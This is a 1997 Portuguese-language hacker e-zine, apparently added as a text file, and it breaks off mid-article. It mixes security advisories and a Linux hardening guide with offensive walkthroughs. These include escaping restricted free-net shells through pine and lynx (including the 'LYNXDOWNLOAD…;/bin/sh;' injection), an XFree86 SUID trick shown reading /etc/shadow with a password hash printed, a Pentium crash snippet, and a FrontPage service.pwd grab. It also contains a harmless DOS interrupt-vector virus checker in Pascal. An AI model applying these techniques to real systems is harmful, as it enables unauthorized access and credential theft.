@@ -1,0 +1,1002 @@
+.oO <Start> Oo.
+[=====================================================]
+|:::::::::::::::::::::::::::::::::::::::::::::::::::::|
+|:::::::""`````""::::::""`:.:`""::"`````"::'"```'.::::|
+|:::: .g#S$$$$$S#n  .g#S$$   $$S#n. $$$S#s s#S$$$ ::::|
+|:::: $$$$$$ $$$$$  $$$$$$ $ $$$$$$ .  $$$ $$$   .::::|
+|:::: $$$$$$ $$$$.  $$$$$$ $ $$$$$$     $$u$$   ::::::|
+|:::: $$$$$$g$$$$$. $$$$$$ $ $$$$$$ :' $$$g$$$  .:::::|
+|:::: $$$$$$  $$$$$ $$$$$$.$.$$$$$$ $$$$$ . $$$$$ ::::|
+|:::: $S$$$$   $$$$ `S$$$$s s$$$$S'.`S$$  :  $$S'.::::|
+|::::.......:.....:::.............:::....:::....::::::|
+[=====================================================]
+
+RWX n. 03  Especial de fim de ano   /   dia: 25/12/97
+
+http://www.cyberspace.org/~rwx
+http://www.necroterium.com.br/rwx
+http://www.cryogen.com/rwx
+       email-us : rwx@null.net
+                : rwx@valise.com
+
+*-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-*
+
+Just about every computer on the market today runs Unix, except the Mac
+(and nobody cares about it).
+                -- Bill Joy 6/21/85
+
+*-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-*
+
+ESCLARECIMENTO
+~~~~~~~~~~~~~~
+Esta e' uma zine voltada a area de seguranca , seja qual  for sua  intencao
+em ler nao nos responsabilizamos  pelo mau uso das informacoes aqui  conti-
+das. Nao estamos  aqui pra ensinar ninguem a ser Hacker ou  um  terrorista,
+nosso  objetivo e a pura troca  de informacao  entre pessoas  que buscam  o
+conhecimento na rede, e nos opomos aqueles que so visam o lucro. Caso  dis-
+corde de algo  ou tenha alguma sujestao, escreva-nos, ficaremos  felizes em
+ouvi-lo.
+
+*-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-*
+
+01#. INTRODUCAO
+
+=[TEXTOS, FAQS]= (Para nao falar que voce sabe tudo)
+02#. ARQUIVOS .* ...............................................DmS
+03#. BUGS & DENIALS RECENTES ...................................KByte
+04#. FREE NETS..................................................auth
+05#. PROGETANDO UM SISTEMA SEGURO...............................Knight
+06#. CYBERCASH..................................................kbyte
+07#. VETORES....................................................skynet
+
+=[NT SPECIAL SECTION]= (Se cuida tio bill)
+08#. FRONTPAGE _vti_pvt.........................................auth
+09#. UPLOADER...................................................x-satanic
+10#. FALSO arquivo..............................................kbyte
+11#. SLmail.....................................................x-satanic
+
+=[NEWZ / ETC's]=
+12#. WORLD NEWZ.................................................rwx
+13#. FINALIZACOES...............................................rwx
+
+*-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-*
+
+01#. INTRODUCAO
+~~~~~~~~~~~~~~~
+welp, estamos aqui novamente para publicarmos nossa zine, nao tao mensal,
+mas pelo menos, ta aqui sempre, para dar uma ajuda a voces, e dar um baita
+de um obrigado por toda a galera que coloca nossas materias e nosso zine na
+suas paginas (alguns lembrados de cabeca: ano 2001 linux page ,e o manual d
+do linux completo), sao muitos, nao da pra lembrar todos, a unica coisa que
+nao deu pra galera se contentar, e que entristeceu a galera, foi que quase
+nenhum admin se importou com nossa zine, nem para colaborar com page ou
+algo assim, mas o importante eh que eles leram, e aposto que eles ficam a
+cada mes esperando na espectativa para sair nosso zine novo. Chega de falar,
+vamos ao zine, e muitas felicidades para esse natal, e um prospero ano novo,
+sao os votos de cada escritor do zine, que contribuem para tornar essa
+sociedade cybernetica um pouco mais livre e sem problemas.
+
+ah.. o zine eh presente de Natal.. :))))
+t+
+auth
+
+*-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-*
+
+02#. ARQUIVOS .* by DmS
+~~~~~~~~~~~~~~~~~~~~~~~
+-= DmS 1995-1997 (c) =-
+
+E ai manos;
+
+Bom  vou escrever essa materia  devido a varias perguntas sobre esses tipos
+de arquivos. Irei falar  sobre os arquivos .* que estao no home de qualquer
+user de um sistema rodando linux. Explicarei varios  arquivos que podem nao
+contem na versao Slackware ou Debian, pois eu utilizo RED HAT.
+
+.bash_history : Arquivo  onde ficam gravados todos os  comandos digitados da
+ultima sessao usada. O arquivo  e' acumulativo, a cada  sessao, quando se da
+um logout, ele automaticamente escreve no arquivo.
+
+.bash_logout : Tem comandos  que vc deseje executar apos a saida de
+ qualquer
+sessao. Como  por  exemplo o comando "clear". Ele  limpara  a tela e
+ deixara
+apenas a tela de login, nao deixando assim a tela "suja".
+
+* .bash_profile : Serve  para executar comandos quando voce "loga" na
+ shell.
+Como exemplo, voce pode determinar paths ou algo parecido.
+
+.bashrc : Mesma funcao do .bash_profile.
+
+.cshrc : Mesma utilidade do .bashrc mas e' utilizado em  shells to tipo csh.
+
+.tcshrc : Utilizado em shells do tipoc tcsh.
+
+* OBS: Se  voce quiser determinar  comandos defaults para  qualquer  usuario
+que "logar" no sistema, ponha os  comandos no arquivo  /etc/profile , que e'
+onde  ficam os  comandos globais, e sao  executados quando  qualquer usuario
+entra no sistema, nao tendo que modificar em todas as "homes" se voce quiser
+determinar algum path, por exemplo, para todos os usuarios.
+
+Espero ter ajudado em algo pro pessoal que ta comecando :))
+
+[]'s
+
+*-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-*
+
+03#. BUGS & DENIALS recentes
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+-= KByte 1995-1997 (c) =-
+-= kbyte@biogate.com   =-
+
+Eu juntei nessa materia varios bugs e exploits recentes.
+Aqui vao eles :
+
+**** Teardrop
+
+O BUG - Esse exploit  eh um serio bug no Ip Fragmentation module . Quando o
+Linux reassembla IP fragmentes para  formar um IP  datagrama , ele roda  em
+um loop, copiando todos os fragmentos para um novo allocated Buffer. Quando
+ele checa pra ver  se o fragment  lenght eh  muito grande , o que teria que
+fazer o kernel copiar muitos dados , ele nao  checa se o fragment lenght eh
+muito pequeno , o que faria o kernel copiar muito dado mesmo assim.
+(Como no caso de if fp->len is <0).
+
+SISTEMAS AFETADOS - Nao se tem ideia,mas sabe-se que afeta Wins (em geral),
+Linux , e outros sistemas
+
+PATCH - Esta indo anexado , para usa-lo digite como root
+
+        cp patchfile.tear /usr/src/linux/net/ipv4
+        cd /usr/src/linux/net/ipv4
+        patch -l < patchfile.tear
+e depois recompile o seu kernel. No kernel 2.0.32 ja lancado , este  bug ja
+esta arrumado.
+
+{{{{{{{ Esta indo anexado o Patch File e o Exploit. }}}}}}}
+
+**** Land (Tcp/IP bug)
+O Land eh  um bug no TCP/IP de varios O.S.es que 'congela' varios sistemas.
+
+BUG - Ele manda  um pacote spoofado com o SYN Flag setado de um host , numa
+porta aberta (Como 113 ou 139) , setando como SOURCE o mesmo host e a porta
+(Ex: De 200.20.20.20:139 para 200.20.20.20:139) causando sistemas a travar.
+
+Sistemas - O bug afeta :
+BSDI 2.1                FreeBSD 2.2.2-RELEASE
+FreeBSD 2.2.5-RELEASE   FreeBSD 2.2.5-STABLE
+FreeBSD 3.0-CURRENT     HP-UX 10.20
+MacOS 8.0               NetBSD 1.2
+NeXTSTEP 3.0            NeXTSTEP 3.1
+OpenBSD 2.1             Solaris 2.5.1
+SunOS 4.1.4             Windows 95 (vanilla)
+Windows 95 + Winsock 2 + VIPUPD.EXE
+NCD X Terminals, NCDWare v3.2.1
+
+PATCH - O mesmo  patch do OOB(Out Of Band) bug do Windows tambem  corrige o
+erro do LAND , voce pode pega-la da microsoft:
+http://support.microsoft.com/download/support/mslfiles/Vtcpupd.exe
+
+{{{{{{{ Vai junto com a zine o Exploit }}}}}}}
+
+OBS : Fiz um script para BitchX que usa o land  e teardrop.Este esta na RwX
+com o nome de rwx.bx ..boa sorte..
+para loadar , digite no BitchX /load /path/to/script/rwx.bx
+
+---------------------------BUG DO PENTIUM-----------------------------
+
+Intel Pentium Bugs - Esse bug afeta diretamente o Chip PENTIUM da INTEL
+fazendo a maquina travar.
+
+BUG - Se voce mandar F0 0F C7 C8 em um P5 voce fara a maquina travar.
+
+NT EXPLOIT -
+char x [5] = { 0xf0, 0x0f, 0xc7, 0xc8 };
+
+main ()
+{
+       void (*f)() = x;
+
+       f();
+}
+
+PATCH - Pra Linux , o kernel 2.0.32 parece corrigir esse problema. Pra
+Windows , bem , updatem pra Linux.:)
+
+---------XF Servers bugs------------XF Server Bugs-------------
+
+* XF86_*, the XFree86 servers (XF86_SVGA, XF86_VGA16, ...) Bug
+
+OS : Todos com XFree 86 3.3.1 ou menor
+
+IMPACTO : O Xfree Server permite voce especificar um config file  alternado
+e nao checa se vc tem permissao para isso e como geralmente sao SUIDS root,
+voce pode ler qualquer arquivo.
+
+EXPLOIT :
+
+[kbyte@kbyte bin]$ ./XF86_SVGA -config /etc/shadow
+Unrecognized option: root:qEXaUxSeQ45ls:10171:-1:-1:-1:-1:-1:-1
+use: X [:<display>] [option]
+-a #                   mouse acceleration (pixels)
+-ac                    disable access control restrictions
+-audit int             set audit trail level
+-auth file             select authorization file
+bc                     enable bug compatibility
+-bs                    disable any backing store support
+-c                     turns off key-click
+....
+
+Como voce pode ver , ele mostra a primeira linha de qualquer arquivo mas ja
+eh alguma coisa..
+
+PATCH - Tirar o SUID dos servers
+
+*-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-*
+
+04#. FREE NETS ?
+~~~~~~~~~~~~~~~~
+-= auth 1995-1997 (c) =-
+
+yeah,yeah, agora vamos aprender um pouco sobre aquelas bibliotecas,ou 'free
+shell existentes no brasil, iremos aprender a como fucar e derrepente, cair
+em uma shell mesmo. Nao sei porque colocar essas  besteiras por telnet, nao
+sei oq tem na cabeca para colocar um risco desses no proprio servidor, isso
+ate me lembra uma biblioteca porai, que irei contar no metodo 1.
+
+-------------------------------------------------------------------
+
+[Metodo 1] - CTRL+C
+==========
+
+*-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-*
+
+Vagando  porai na net, sem fazer nada, dei de  cara com uma biblioteca, por
+sinal, muito  boa, acho que  era la do RS, mas, tudo que eh bom tem que ter
+sua  falha, sempre quando  voce ou alguem  cair direto em um  telnet de uma
+biblioteca, ou coisa parecida, as senhas e os logins sempre serao guest, ou
+new, as vezes o proprio serv. da o login. Logo depois de logar, voce cai em
+um menu altamente complexo,que na hora cai para uma shell,com uma sequencia
+de CTRL+C, e outros. he, grande seguranca.
+
+-------------------------------------------------------------------
+
+[Metodo 2] - PINE
+==========
+
+Depois do metodo1, vamos entrar em uma freenet que libere o PINE.
+Primeiro, voce deve editar o .pinerc, e deve acrescentar essas linhas.
+
+feature-list=enable-alternate-editor-cmd,
+             enable-unix-pipe-cmd
+
+Logo apos, voce deve procurar uma linha chamada 'editor=' e acrescentar
+'editor=sh' ,assim, salve o arquivo.
+Vamos agora escrever, ops, cair na nossa shell, temos que escrever um
+email assim:
+
+To      :
+Cc      :
+Attchmnt:
+Subject :
+----- Message Text -----   ]--- opa... :)
+sh
+$
+
+-------------------------------------------------------------------
+
+[Metodo 3] - jpico
+==========
+
+Aqui,o negocio eh raleh mesmo, eh soh mexer um pouco com este editor,e voce
+logo  achara um  menu: "shell" (hehe), pronto, se nao me engano, eh a tecla
+CTRL+Z.
+
+-------------------------------------------------------------------
+
+[Metodo 4] - lynx
+==========
+
+Os  metodos anteriores sao um pouco raros, mas , mesmo assim , encontrei  5
+servers com problemas daquele tipo aqui no brasil. Mas agora, ja eh questao
+de decencia do provedor, liberar o lynx eh loucura.
+
+Quando voce cair no lynx, tecle G (de GO):
+
+ Arrow keys: Up and Down to move. Right to follow a link; Left to go back.
+H)elp O)ptions P)rint G)o M)ain screen Q)uit /=search [delete]=history list
+                      ^---aqui
+
+logo apos ele escrever:
+URL to open: voce deve escrever algo assim:
+
+LYNXDOWNLOAD://Method=-1/File=/dev/null;/bin/sh;/SugFile=/dev/null
+
+(hehehe)
+
+Quando aparecer, "enter a filename:" voce deve escrever "/dev/null"
+E aparecera, "File exists. Overwrite? (y/n)" tecle Y.
+
+obs: Na maioria das vezes, nao eh habilitado a mexer. Dai, eh
+melhor pensar em outra. :)
+
+E derrepente se tudo der certo aparecera um $ :)))
+
+-------------------------------------------------------------------
+
+[Metodo 5] lynx muito bugado
+==========
+
+Ok , para voces, devem  estar cansados de lerem tanta asneira, mas, qual  o
+problema de voces lerem  algo em portugues puro e algo novo? Esse problema,
+pode  ser  feito em  qualquer  tipo de maquina, desde  que liberem  o lynx,
+diretamente por um menu, ou por um l: lynx p: lynx.
+
+Vamos por telnet:
+
+$ telnet universidade.tal.br
+Trying...
+Connected to universidade.tal.br
+Escape character is '^]'.
+
+Linux 2.0.32 (universidade.tal.br) (ttyp0)
+
+Welcome to Linux 2.0.32.  <soh em sonho uma universidade 2.0.32.. hehe)
+
+universidade.tal.br login: lynx
+Password:
+
+Linux 2.0.29.
+Last login: Fri Oct  3 17:11:59 on ttyp0 from universidade.tal.br
+You have new mail.
+
+(ira entrar no lynx automaticamente)
+----------------------------------------------------------------------------
+
+                                    Lynx
+
+bla,bla, aqui ira aparecer muita coisa, logo apo
+s isso tudo, voce tera
+esse menu:
+
+     _________________________________________________________________
+
+-- press space for next page --
+  Arrow keys: Up and Down to move. Right to follow a link; Left to go back.
+ H)elp O)ptions P)rint G)o M)ain screen Q)uit /=search [delete]=history list
+
+-----------------------------------------------------------------------------
+
+Agora voce deve teclar "O" de options. Ira vir algo assim:
+
+-----------------------------------------------------------------------------
+
+              Options Menu (Lynx Version 2.6)
+
+     E)ditor                      : NONE
+     D)ISPLAY variable            : NONE
+     B)ookmark file               : lynx_bookmarks.html
+     F)TP sort criteria           : By Filename
+     P)ersonal mail address       : NONE
+     S)earching type              : CASE INSENSITIVE
+     display (C)haracter set      : ISO Latin 1
+     Raw 8-bit or CJK m(O)de      : ON
+     preferred document lan(G)uage: en
+     preferred document c(H)arset : NONE
+     V)I keys                     : OFF
+     e(M)acs keys                 : OFF
+     K)eypad mode                 : Numbers act as arrows
+     li(N)e edit style            : Default Binding
+     l(I)st directory style       : Mixed style
+     sho(W) dot files             : OFF
+     U)ser mode                   : Novice
+     user (A)gent                 : Lynx/2.6  libwww-FM/2.14
+
+  Select capital letter of option line, '>' to save, or 'r' to return to Lynx.
+
+-----------------------------------------------------------------------------
+
+Estao ligados na opcao E)ditor ? entao, esse browser, espera que
+voce coloque um dos editores, tipo, mcedit, pico, vi, etc. Mas, ele
+nao requer que seja um editor, pode ser qualquer file. :)
+
+	[editor] <arquivo>
+
+Agora voce deve escrever: "exec". Depois disso, voce tera que salvar
+as opcoes novas, tecle ">".
+Agora que sua armacao esta pronta, voce deve teclar "G" e ir para:
+
+	file://localhost/bin/sh
+
+Como nos alteramos anteriormente o editor, ele tentara abrir o sh
+como binario e tal, vai vir um monte de lixo. Mas, como colocamos
+aquela secreta: exec. Temos algo em comum, ele executara o /bin/sh,
+hehehe, massa. (aparecera muito lixo, e la em baixo, bash#)
+Tecle para o terminal:
+
+	TERM=vt100 export TERM
+
+*-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-*
+
+05#. PROJETANDO UM SISTEMA SEGURO
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+by knight (knight@xxx.xxx.xxx.xxx)
+
+  E ai pessoal, to de volta :).... !!!! eheheheh vamo comecar .. :)
+ Tipo nessa materia tentarei explicar como projetar um sistema + ou -
+ seguro, como vcs ja sabem nem um sistema e completamente seguro :) hehe.
+ entao vamo nessa, vou dividir essa materia em 3 partes ;)..
+
+                         [1] Projetando no Papel.
+                         [2] Organizamento.
+                         [3] Botando na Pratica.
+
+   -----
+   [1] Projetando no Papel.
+
+    Para voce conseguir criar um um configuracao com o minimo de falhas
+  possivel, voce sempre tem que pensar de 2 maneiras , do tipo 2 lados da
+  moeda ;) , tipo como seria para entrar e como seria para proteger pensa-
+  ndo desse modo , se torna + ou - facil , proteger um sistema de intrusos.
+  Um geito legal, e voce assinando listas de discursao sobre seguranca
+  tipo a BUGTRAQ (http://geek-girl.com/bugtraq/).
+
+    Com isso voce sabera onde seu sistema possui pontos fracos ai e so
+  ajeitar.. cumpadi proteger um sistema na e para qualquer um :) ..
+
+   -----
+   [2] Organizamento.
+
+   Agora , o que voce tem a fazer e pegar organizar sua maquina, do tipo
+  faca o possivel para sempre mudar os dir's de home , de logs e tudo
+  assim dificultando um ataque. do tipo no syslog.conf adicione as mesmas
+  linhas direcionando para um tty do tipo tty12 que corresponde a tecla
+  ALT+F12 ai basta voce pressionar essas teclas que voce vera o log da
+  maquina , outra tambem e colocar no crontab para de 15 em 15 minutos
+  imprimir o log , ai de 1:00am as 6:00am colocara para imprimir de 5 em
+  5 minutos ( ehhehe haja papel ;) ), outra tambem e voce saber definir
+  e colocar na maquina so o que realmente ela vai usar, do tipo um maquina
+  que servira para irc, nao tem porque ter sendmail(porta 25) , pop3d(porta
+  110) ou www(porta 80) esta aberta, podendo facilitar a invasao.
+
+   ------
+   [3] Botando na Pratica.
+
+   HEHE agora vem a porrada :), hehehe vamo comecar ,, vou tentar colocar
+  os comandos se nao.. voce se vira OK???!!! :). vamo passando de dir em
+  dir e fazendo as devidas modificacoes , OK?? :)
+
+    [/etc]
+
+   EHEH aqui nesse dir tem muito a fazer :) , vamo la
+
+   * caso voce nao use shadow , de chmod 000 /etc/passwd*  toda fez que
+     efetuar o logon na maquina para facilitar coloque no rc.local
+
+   * sempre verifique os arquivo /etc/inetd.conf e /etc/services, para
+     ver se nao tem nada de estranho do tipo backdoor's.
+
+   * Nunca, mas nunca coloque no /etc/exports alguma dir para everyone
+     is very dangerous :)..
+
+   * no /etc/syslog.conf procura colocar um copia dos logs para um dir
+     bem estranho, do tipo que voce mesmo nunca pensaria que estivesse
+     la os logs. EHHE se o intruso for muito burro ele cai ;).
+
+   * no /etc/hosts.deny coloque os servicos que voce nao quer liberar
+     para connecoes externas do tipo wu.ftpd assim
+
+     wu.ftpd:ALL:twist /bin/echo Connecao Negada [%h]
+
+   * no /etc/hosts.allow voce coloca os servicos que voce quer dar
+     acesso para os outros sempre coloque ALL:localhost e tmb
+     coloque ALL:200.241.114.* caso  o ip da sua maquina seja
+     200.241.114.X ai todos os ip's dela podem acessar os servicos
+
+   [/bin]
+
+   * tire os suid's bit de todos os progs que possui Overflow code ou seja
+     que sao vulneraveis a exploits , (ex, mount, umount, ping , etc).
+
+   [/sbin]
+
+   * Tire os suid's bit do dip*
+
+   [/lib]
+
+   * Cuidado com o ld.so , pegue a versao + atualizada
+
+   [/usr/bin]
+
+   * Tire suid bit , do sperl , splitvt , at, lpr, crontab
+
+   [/usr/X11R6/bin]
+
+   * Tire os suid's bit de todos os XF86_* , de color_xterm, xterm
+     xlock, SuperProbe, rxvt e outros.
+
+   -----
+
+   Pronto , agora voce ja estar um pouco + seguro, procure sempre se
+  sobre bug's novos, e sempre pegue os patches, nao TENHA PREGUICA ;)
+
+**** Arquivo para testarem problemas em cgi: cgibug.c ****
+
+by knight
+
+*-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-*
+
+06# CyberCash Security Problem
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+-= KByte 1995-1997 (c) =-
+
+Este  bug eh  muito serio, pois trata de  um servico  de Cartoes de Credito
+Virtual que podem ser  aproveitados por terceiros para comprar via InterNET
+
+Programa : CyberCash v 2.1.2
+
+Configuracao : Este bug se apresenta no CyberCash em sua instalacao e
+configuracao Default.
+
+Exploit : O CyberCash quando esta com o  DEBUG Ligado , loga todas as tran-
+sacoes para um arquivo Word Readable (que em default eh o Debug.log)!
+Isto  e' , qualquer usuario no sistema pode  pegar os todas as informacoes
+processadas  pelo  Server. Bem , entao e' so setar o Debug para 0...Ai que
+voce  se engana , o  CyberCash tem essa limitacao , mesmo setando o  debug
+para 0 , o server continuar a agir com o DEBUG habilitado.
+Esta  limitacao de desligar  o debug esta no CyberCash home page conhecido
+como "Know Limitation". O  fato  eh que  numeros de  cartoes  estao  sendo
+armazenados em clear texto , num arquivo World Readable.
+
+PATCH - Nao tenho conhecimento de nenhum patch , mas  aconselho a procurar
+a CyberCash ou esperar uma nova versao.
+
+*-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-*
+
+7#. Vetores de Interrupcao - Limpando virus da RAM.
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+by Skynet 4/12/97
+
+Hi d00dz,.
+
+Ao contrario das outras materias que tenho escrito, esta sera a usuarios
+do DOS, que ainda sobrevive mesmo com a evolucao dos sistemas de 32 bits.
+
+Grande parte dos virus existentes tem o costume de alterar certos vetores
+de interrupcao do DOS com o proposito de se instalarem no sistema.
+Geralmente os alvos prediletos sao os vetores 08h e 21h, que lhe
+possibilita entrar em acao.
+
+Entrando em mais detalhes...
+
+INT 08h - Aponta para o Timer(contador de tempo). O virus necessita desse
+=======   vetor para determinar a hora de entrar em acao, como por
+          exemplo, o Michelangelo. Esse vetor pode tambem ser alterado
+          por programas do tipo  'relogio na tela' ou por utilitarios
+	  residentes que manipulem informacoes de tempo.
+
+INT 21h - Contem todos os servicos basicos de disco do DOS. Os virus
+=======   interceptam o vetor desta interrupcao com o intuito de
+	  utilizar os servicos de maneira diferente - para detonar os
+	  arquivos do HD, por exemplo. Esse vetor, ao contrario do 08h,
+	  dificilmente sera alterado por algum programa comum, o que
+	  torna sua alteracao bastante suspeita de ser algum virus em
+	  acao.
+
+Nesta materia apresento um programinha detecta uma entrada de virus no sistema.
+Ele permite que se observe, salve, restaure e compare os vetores de interrupcao
+eliminando,assim qualquer virus que fique residente na memoria.
+
+Utilizando o programa
+=====================
+Obviamente, a primeira coisa que vc tera de fazer eh ter certeza de que
+atualmente seu sistema esta sao e salvo de qualquer virus, e isso eh
+de resposabilidade sua. Estando certo disso, devemos gerar o arquivo com
+os dados contendo sua atual tabela de vetores em uso. Eh importante gravar
+uma copia do registro em um disquete limpo.
+Compile o aquivo no Turbo Pascal(eu uso o 5.0) e quando executado, lhe
+sera mostrado as seguintes opcoes de uso:
+
+1) /L  Lista os Vetores em Uso.
+------------------------------
+Esta opcao permite listar na tela todos os vetores que estejam em uso. A
+lista sera apresentada no formato VETOR VV = XXXX:XXXX, sendo que os
+valores do vetor e do endereco segmentado estarao em Hexadecimal.
+
+2) /G  Grava os vetores em disco.
+---------------------------------
+Aqui sera salvo o registro em um arquivo chamado vetores.dat. Eh
+importante guardar uma copia de seguranca desse arquivo em um disquete
+recem formatado.
+
+3) /R Restaura os vetores do disco.
+-----------------------------------
+Esta opcao permite ler do arquivo vetores.dat os enderecos dos vetores
+salvos e restaura-los nos vetores do sistema.
+
+4) /V Verifica se os vetores conferem com os salvos no disco.
+-------------------------------------------------------------
+A opcao /V compara os vetores atuais com aqueles que foram salvo
+anteriormente(opcao /G), ele procura o arquivo "vetores.dat". Se alguma coisa
+foi alterada vc sera notificado com "beeps", verifique bem as interrupcoes.
+Sempre havera alteracoes.. mas se ligue em qual ;) heheh..
+
+OBS: Se apos salvar os vetores vc notar que houve infeccao por algum virus,
+===  basta restaurar os vetores que foram salvo anteriormente, anulando
+     assim o virus da memoria. Entretando isso nao significa que vc esta
+     livre do virus em questao, pois o mesmo pode estar em algum arquivo
+     do HD. Nesse caso eh bom procurar um bom antivirus. ;-)
+
+--------------------------- CORTE AQUI ---------------------------------
+{******** ScanVector 1.0    By Skynet 1997 **************}
+
+{SCANVECTOR.PAS}
+
+Program vetores;
+Uses crt,dos;
+Type SegOfs = record
+              O,S:word;
+              end;
+
+Const Digitos : Array[0..$F] of
+                Char = '0123456789ABCDEF';
+                Nome : String[12] = 'vetores.dat';
+Var             p,p1 : Pointer;
+                a,u,v: byte;
+                arq  : File Of Pointer;
+                l    : String[40];
+                alter: Boolean;
+
+Function HexaB(B:byte):String;
+ begin
+   HexaB[0]:= #2;
+   HexaB[1]:= Digitos [B shr 4];
+   HexaB[2]:= Digitos [B and $F];
+ end;
+
+ Function HexaW(W : Word) : String;
+  begin
+   HexaW[0]:= #4;
+   HexaW[1]:= Digitos[hi(W) shr 4];
+   HexaW[2]:= Digitos[hi(W) and $F];
+   HexaW[3]:= Digitos[lo(W) shr 4];
+   HexaW[2]:= Digitos[lo(W) and $F];
+  end;
+
+  Function Hexa (n:byte ; pt:Pointer) : String;
+   Var SO : SegOfs Absolute pt;
+   begin
+     Hexa:=HexaB(n)+ ' = '+HexaW(SO.S)+':'+HexaW(SO.S);
+   end;
+   Function HexaP (pt : Pointer) : String;
+    Var SO: SegOfs Absolute pt;
+     begin
+      HexaP:=HexaW(SO.S)+':'+ HexaW(SO.O);
+     end;
+
+     Procedure Aborta ( erro : string);
+     begin
+      HighVideo;
+      Writeln( '       RWX Security presents ');
+      NormVideo;
+      Writeln;
+      Writeln ( 'Sintaxe: scanvect (opcao) ');
+      Writeln;
+      Writeln ('  /L   Lista os Vetores em Uso;');
+      Writeln ('  /G   Grava os Vetores em Disco;');
+      Writeln ('  /R   Restaura os Vetores do Disco;');
+      Writeln ('  /V   Verifica se os vetores conferem;');
+      Writeln ('       com os salvos no disco.;');
+      Writeln;
+      If Erro<> ''then Writeln(#7, 'Parametro '+erro+' invalido...');
+         Halt(1);
+      end;
+      { Comecando o Programa Principal}
+      begin
+       IF ParamCount=0 Then Aborta('');
+       L:=ParamStr(1);
+       For A:=1 to Length(L) do L[A]:=UpCase(L[A]);
+       IF L[1]='/' then
+         begin
+          Case L[2] of
+           'L': begin
+                  U:=0;
+                  V:=0;
+                  Writeln ('Listagem dos Vetores(Hexa)');
+                  Writeln;
+                  For A:=0 to 255 do
+                   begin
+                    GetIntVec(A,P);
+                    If P<>NIL then
+                     begin
+                      Writeln( 'Vetor '+Hexa(A,P));
+                      Inc(U);
+                      If ( U MOD 23 = 0) then
+                       Repeat Until ReadKey<>#0;
+                      end;
+                     end;
+                     Writeln;
+                     Writeln ('Em Uso ',U:3,' vetores');
+                    end;
+          'G' : begin
+                   Assign(Arq,nome);
+                   Rewrite(Arq);
+                   For A:=1 to 255 do
+                   begin
+                    GetIntVec(A,P);
+                    Write(Arq,P);
+                   end;
+                   Close(Arq);
+                   Writeln ('Tabela de Vetores Salva em'+Nome);
+                 end;
+          'R' : begin
+                   Assign(Arq,nome);
+                   Reset(Arq);
+                   For A:=1 to 255 do
+                   begin
+                     Read(Arq,P);
+                     SetIntVec(A,P);
+                   end;
+                   Close(Arq);
+                   Writeln('Tabela de Vetores Restaurada de '+nome);
+                end;
+          'V' : Begin
+                   Assign(Arq,nome);
+                   Reset(Arq);
+                   Alter:=false;
+                   Write('Comparando Vetores...');
+                   For A:=1 to 255 do
+                    begin
+                     Read(Arq,P1);
+                     GetIntVec(A,P);
+                     if P<>P1 then
+                     begin
+                       If Alter=false then Writeln;
+                          Writeln(#7, 'Vetor '+HexaB(A)+'mudou de '+
+                                      HexaP(P1)+' para '+HexaP(P));
+                          Alter:=True;
+                       end;
+                    end;
+                    Close(Arq);
+                    If(Alter=false) then
+                     begin
+                      writeln;
+                      Writeln('Vetores Iguais aos do Arquivo '+nome);
+                     end;
+                 end;
+                 Else aborta(L);
+               end;
+         end else aborta(L);
+end.
+---------------------------- CORTE AQUI ---------------------------------
+
+*-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-*
+
+=[NT SPECIAL SECTION]=
+(Se cuida tio bill)
+
+08# FRONTPAGE _vti_pvt..............................auth
+09# UPLOADER........................................x-satanic
+10# FALSO arquivo...................................kbyte
+11# SLmail..........................................x-satanic
+
+*-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-*
+
+8#. FRONTPAGE _vti_pvt bug
+~~~~~~~~~~~~~~~~~~~~~~~~~~
+-= auth 1995-1997 (c) =-
+
+Yeah, yeah, olha eu ca denovo, escrevendo de montao, acho que isso aqui nao
+sei, mas  acho  que  muita gente  nao conhece, eh  um problema  pequeno nas
+extensoes do frontpage (he, adivinha para qual SO?).
+
+Tudo  se baseia no _vti_pvt, que ao ser chamado, cai  bem, em nos mostrar o
+service.pwd (senhas.. hihehie), ou seja,voce deve chamar algo mais ou menos
+assim:
+
+http://www.*****t.com.br/_vti_pvt/service.pwd
+
+E pronto, voce caira com o pwd na mao, claro que ele esta  encriptado, mas,
+recem ai esse ano, a l0pht lancou algo bom para o nt, (Vai procura :)
+so, let's party.
+
+*-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-[*]-*
+
+9#. UPLOADER bug
+~~~~~~~~~~~~~~~~
+-= X-SaTaNiC 1995-1997 (c) =-
+
+1st Disclaimer:
+Primeiro de tudo, essa eh a primeira vez (espero que nao seja a ultima) que
+escrevo para a Rwx e isso e muito gratificante para mim,pois escrever pruma
